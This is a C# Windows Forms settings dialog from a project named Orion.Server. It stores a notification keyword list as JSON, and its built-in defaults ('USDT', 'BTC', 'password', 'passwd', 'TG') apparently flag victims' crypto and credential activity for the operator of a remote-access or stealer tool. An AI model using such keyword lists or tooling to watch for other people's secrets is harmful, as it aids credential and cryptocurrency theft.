using Newtonsoft.Json;
using Orion.Server.Forms.DarkMode;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace Orion.Server.Forms
{
    public partial class FrmKeywords : Form
    {
        private static readonly string OrionStuffDir = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "OrionStuff");

        public FrmKeywords()
        {
            InitializeComponent();
            DarkModeManager.ApplyDarkMode(this);
        }

        private void SaveNoti_Click(object sender, EventArgs e)
        {
            string text = NotiRichTextBox.Text;
            var keywords = text.Split(',')
                               .Select(word => word.Trim())
                               .Where(word => !string.IsNullOrWhiteSpace(word))
                               .ToList();
            string json = JsonConvert.SerializeObject(keywords, Formatting.Indented);
            string filePath = Path.Combine(OrionStuffDir, "keywords.json");
            if (!Directory.Exists(OrionStuffDir))
            {
                Directory.CreateDirectory(OrionStuffDir);
            }
            File.WriteAllText(filePath, json, Encoding.UTF8);
            MessageBox.Show("关键词保存成功！");
        }

        private void FrmKeywords_Load(object sender, EventArgs e)
        {
            string filePath = Path.Combine(OrionStuffDir, "keywords.json");
            if (!File.Exists(filePath))
            {
                var exampleKeywords = new List<string> { "USDT", "passwd", "password", "user", "TG", "BTC"};
                string exampleJson = JsonConvert.SerializeObject(exampleKeywords, Formatting.Indented);
                if (!Directory.Exists(OrionStuffDir))
                {
                    Directory.CreateDirectory(OrionStuffDir);
                }
                File.WriteAllText(filePath, exampleJson, Encoding.UTF8);
            }
            if (File.Exists(filePath))
            {
                string json = File.ReadAllText(filePath, Encoding.UTF8);
                var keywords = JsonConvert.DeserializeObject<List<string>>(json);
                if (keywords != null && keywords.Any())
                {
                    NotiRichTextBox.Text = string.Join(", ", keywords);
                }
            }
        }
    }
}
